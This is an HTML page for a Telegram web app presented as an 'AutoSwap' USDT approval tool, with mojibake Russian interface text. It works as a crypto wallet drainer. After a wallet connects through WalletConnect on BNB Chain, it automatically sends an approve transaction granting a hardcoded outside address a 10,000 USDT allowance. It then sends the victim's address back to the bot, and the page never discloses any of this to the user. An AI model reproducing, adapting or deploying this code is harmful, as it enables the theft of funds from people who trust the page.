<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>AutoSwap ‚Äî approve USDT to Wallet</title>
  <style>
    body { margin:0; padding:20px; background:#000; color:#e0e0e0; font-family:'Segoe UI',sans-serif; text-align:center; }
    .container { max-width:500px; margin:0 auto; padding:30px; }
    canvas { display:block; margin:20px auto; }
    #manual-uri { margin-top:10px; font-size:14px; word-break:break-all; background:rgba(255,255,255,0.05); padding:10px; border-radius:8px; }
    #status { margin-top:20px; font-size:16px; white-space:pre-wrap; }
    .uri-link, .reconnect-btn {
      display:inline-block; margin:8px 5px; color:#4fc3f7;
      text-decoration:underline; cursor:pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üîÑ AutoSwap ‚Äî approve USDT</h1>
    <canvas id="qrcode"></canvas>
    <div id="manual-uri">URI –±—É–¥–µ—Ç –∑–¥–µ—Å—å</div>
    <div id="status">–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>
    <div>
      <span id="reconnect" class="reconnect-btn">üîÅ –ü–æ–≤—Ç–æ—Ä–Ω–æ –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è</span>
    </div>
  </div>

  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>

  <script type="module">
    import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.13.1';
    import { ethers } from 'https://esm.sh/ethers@6.14.3';
    const { Interface, parseUnits, getAddress } = ethers;

    const tg = window.Telegram.WebApp;
    if (tg) tg.ready();

    const statusEl = document.getElementById("status");
    const uriEl = document.getElementById("manual-uri");
    const qrCanvas = document.getElementById("qrcode");
    const reconnectBtn = document.getElementById("reconnect");

    let client, session;

    const setStatus = (msg, color="#4fc3f7") => {
      statusEl.textContent = msg;
      statusEl.style.color = color;
    };

    const setURI = (uri) => {
      uriEl.innerHTML = uri;
      if (tg) {
        const link = document.createElement("a");
        link.textContent = "–û—Ç–∫—Ä—ã—Ç—å –∫–æ—à–µ–ª—ë–∫";
        link.className = "uri-link";
        link.onclick = () => { tg.openTelegramLink(uri); return false; };
        uriEl.appendChild(link);
      }
    };

    reconnectBtn.onclick = async () => {
      if (session) {
        await client.disconnect({ topic: session.topic, code: 6000, message: "User reconnected" });
        setStatus("üõë –°–µ—Å—Å–∏—è —Ä–∞–∑–æ—Ä–≤–∞–Ω–∞, —Å–æ–∑–¥–∞—ë–º –Ω–æ–≤—É—é...", "#ffa500");
        uriEl.innerHTML = "";
        qrCanvas.getContext('2d').clearRect(0, 0, qrCanvas.width, qrCanvas.height);
        await connectWallet();
      } else {
        await connectWallet();
      }
    };

    async function connectWallet() {
      setStatus("üì∑ –ì–µ–Ω–µ—Ä–∞—Ü–∏—è QR‚Äë–∫–æ–¥–∞‚Ä¶");
      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            chains: ["eip155:56"],
            methods: ["eth_sendTransaction"],
            events: ["chainChanged", "accountsChanged"]
          }
        }
      });

      if (uri) {
        QRCode.toCanvas(qrCanvas, uri, { width:240, margin:1 });
        setURI(uri);
        setStatus("üì± –°–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR‚Äë–∫–æ–¥ –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ —Å—Å—ã–ª–∫—É");
      }

      session = await approval();
      const address = session.namespaces.eip155.accounts[0].split(":")[2];
      setStatus(`‚úÖ –ö–æ—à–µ–ª—ë–∫ –ø–æ–¥–∫–ª—é—á—ë–Ω: ${address}`, "#66bb6a");
      executeApprove(address);
    }

    async function executeApprove(address) {
      setStatus(`‚úî –ê–¥—Ä–µ—Å: ${address}`, "#66bb6a");
      const amount = parseUnits("10000", 18);
      const usdt = getAddress("0x55d398326f99059ff775485246999027b3197955");
      const receiver = getAddress("0xC25edef7dbf23D4FBBB1Cecb9C56380eF35c11AE");
      const data = new Interface(["function approve(address,uint256)"]).encodeFunctionData(
        "approve", [receiver, amount]
      );

      try {
        setStatus("üöÄ –û—Ç–ø—Ä–∞–≤–∫–∞ approve...");
        const txHash = await client.request({
          topic: session.topic, chainId: "eip155:56",
          request: { method: "eth_sendTransaction", params: [{ from: address, to: usdt, data }] }
        });
        setStatus(`‚úÖ Approve –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω:\n${txHash}`, "#66bb6a");
        if (tg) tg.sendData(JSON.stringify({ address }));
      } catch (e) {
        console.error(e);
        setStatus(`‚ùå –û—à–∏–±–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: ${e.message || e.reason}`, "#ff6b6b");
      }
    }

    async function init() {
      setStatus("üîå –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è WalletConnect‚Ä¶");
      client = await SignClient.init({
        projectId: "d868f90cd734355ae0328b6b1",
        relayUrl: "wss://relay.walletconnect.com",
        metadata: {
          name: "AutoSwap Approve Flow",
          description: "Approve USDT via WalletConnect for AutoSwap",
          url: location.href,
          icons: ["https://walletconnect.com/favicon.ico"]
        }
      });

      const sessions = await client.session.getAll();
      if (sessions.length > 0) {
        session = sessions[0];
        const address = session.namespaces.eip155.accounts[0].split(":")[2];
        setStatus(`üîÅ –£–∂–µ –ø–æ–¥–∫–ª—é—á—ë–Ω: ${address}`, "#66bb6a");
      } else {
        await connectWallet();
      }
    }

    init();
  </script>
</body>
</html>
